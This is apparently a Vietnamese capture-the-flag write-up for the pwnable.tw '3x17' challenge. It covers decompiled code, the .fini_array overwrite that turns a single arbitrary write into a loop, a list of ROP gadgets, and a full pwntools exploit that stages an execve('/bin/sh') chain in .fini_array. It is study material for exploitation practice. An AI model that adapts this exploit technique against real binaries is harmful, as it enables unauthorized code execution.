# 3x17

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/3x17$ checksec 3x17
[*] '/mnt/d/pwn_myself/pwnable_tw/3x17/3x17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/3x17$ ./3x17
addr:0x100
data:0x789

```

### start

```c
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  unsigned int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  void *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  sub_401EB0(sub_401B6D, v4, &retaddr, sub_4028D0, sub_402960, a3, &v5);
  __halt();
}

```

### sub_401B6D

```c
__int64 sub_401B6D()
{
  __int64 result; // rax
  char *v1; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  result = ++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    sub_446EC0(1u, "addr:", 5uLL);
    sub_446E20(0, buf, 0x18uLL);
    v1 = sub_40EE70(buf);
    sub_446EC0(1u, "data:", 5uLL);
    sub_446E20(0, v1, 0x18uLL);
    result = 0LL;
  }
  if ( __readfsqword(0x28u) != v3 )
    sub_44A3E0();
  return result;
}

```

### sub_4028D0

```c
__int64 __fastcall sub_4028D0(unsigned int a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  signed __int64 v5; // r14
  __int64 i; // rbx

  result = init_proc();
  v5 = off_4B40F0 - funcs_402908;
  if ( v5 )
  {
    for ( i = 0LL; i != v5; ++i )
      result = (funcs_402908[i])(a1, a2, a3);
  }
  return result;
}

```

### sub_402960

```c
__int64 sub_402960()
{
  signed __int64 v0; // rbx

  if ( (&unk_4B4100 - off_4B40F0) >> 3 )
  {
    v0 = ((&unk_4B4100 - off_4B40F0) >> 3) - 1;
    do
      off_4B40F0[v0--]();
    while ( v0 != -1 );
  }
  return term_proc();
}

```

```shell
.init_array:00000000004B40E0 ; ===========================================================================
.init_array:00000000004B40E0
.init_array:00000000004B40E0 ; Segment type: Pure data
.init_array:00000000004B40E0 ; Segment permissions: Read/Write
.init_array:00000000004B40E0 _init_array     segment qword public 'DATA' use64
.init_array:00000000004B40E0                 assume cs:_init_array
.init_array:00000000004B40E0                 ;org 4B40E0h
.init_array:00000000004B40E0 funcs_402908    dq offset sub_401B40    ; DATA XREF: sub_4028D0+2↑o
.init_array:00000000004B40E0                                         ; sub_4028D0+B↑o ...
.init_array:00000000004B40E8                 dq offset sub_4015B0
.init_array:00000000004B40E8 _init_array     ends
.init_array:00000000004B40E8
.fini_array:00000000004B40F0 ; ===========================================================================
.fini_array:00000000004B40F0
.fini_array:00000000004B40F0 ; Segment type: Pure data
.fini_array:00000000004B40F0 ; Segment permissions: Read/Write
.fini_array:00000000004B40F0 _fini_array     segment qword public 'DATA' use64
.fini_array:00000000004B40F0                 assume cs:_fini_array
.fini_array:00000000004B40F0                 ;org 4B40F0h
.fini_array:00000000004B40F0 off_4B40F0      dq offset sub_401B00    ; DATA XREF: sub_4028D0+4C↑o
.fini_array:00000000004B40F0                                         ; sub_402960+8↑o
.fini_array:00000000004B40F8                 dq offset sub_401580
.fini_array:00000000004B40F8 _fini_array     ends
.fini_array:00000000004B40F8

```

Như có thể thấy thì hàm **sub_4028D0** call tới **.init_array**, và **sub_402960** call tới **.fini_array**.

Chúng ta cần chú ý đến 2 phân vùng : .init_array và .fini_array: [For more but mình đọc k hiểu](http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html)

* init_array: cung cấp các hàm contructor cho chương trình trước khi hàm main() được thực hiện
* fini_array: cung cấp các hàm destructor cần thiết sau khi kết thúc hàm main(), trước khi kết thúc chương trình
* fini_array bao gồm 2 entry:
* foo_destructor : chính là hàm gọi destructor
* do_global_dtors_aux : hàm nãy sẽ chạy tất cả các global destructor(trên hệ thống) để thoát khỏi chương trình, trong trường hợp phân vùng .fini_array không được định nghĩa.
* Hai hàm này được gọi theo thứ tự: gọi foo_destructor trước, sau đó đến do_global_dtors_aux

Đại khái là binary này cho phép ta ghi lên 1 địa chỉ tùy ý, tuy nhiên nó chỉ có cho ghi có 1 lần, lại không thể sử dụng shellcode *nx enable*

Do đó ta cần tự lực cánh sinh tạo ra vòng lặp giúp ta có thể ghi được nhiếu tí. Cụ thể thì **.init_array** thực thi xong tới **main** xong gọi tới **.fini_array** do đó thì ta có thể over write sao cho lúc gọi tới đây thì nó nhảy vô hàm main, nhảy vô main xong phải tiếp tục gọi tới **.fini_array**. Mà để gọi được tới **.fini_array** ta sẽ call **sub_402960**. mà thêm nữa t k thể thực thi shellcode => dùng rop trong chall này.

Vài thứ hữu ích:

```python
_fini_array_addr = 0x4b40f0
_fini_array_caller = 0x402960
_main_addr = 0x401b6d

0x00000000004022b4 : syscall       # execve
0x0000000000401696 : pop rdi ; ret # address 0f /bin/sh
0x0000000000446e35 : pop rdx ; ret # 0
0x0000000000406c30 : pop rsi ; ret # 0
0x000000000041e4af : pop rax ; ret # 0x3b

0x0000000000401c4b : leave ; ret   # thoát khỏi vòng lặp do đã ghi đủ các thứ cần thiết và ret ngay vô các gadgets

```

### Exploit

```python
from pwn import *

r = process("./3x17")

def write(addr, data):
    r.recvuntil(b'addr:')
    r.sendline(str(addr))
    r.recvuntil(b'data:')
    r.send(data)

fini_array_addr = 0x4b40f0
fini_array_caller = 0x402960
main_addr = 0x401b6d
leave_ret = 0x401c4b
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rax = 0x41e4af
pop_rdx = 0x446e35
bin_sh = fini_array_addr + 88

write(fini_array_addr + 00, p64(fini_array_caller) + p64(main_addr))
write(fini_array_addr + 16, p64(pop_rax)           + p64(0x3b))
write(fini_array_addr + 32, p64(pop_rdx)           + p64(0))
write(fini_array_addr + 48, p64(pop_rsi)           + p64(0))
write(fini_array_addr + 64, p64(pop_rdi)           + p64(bin_sh))
write(fini_array_addr + 80, p64(syscall)           + b'/bin/sh\x00')

write(fini_array_addr, p64(leave_ret)) # ghi vào fini để lần sau quay về đây thì nhảy vô gadget của mình luôn
r.interactive()

```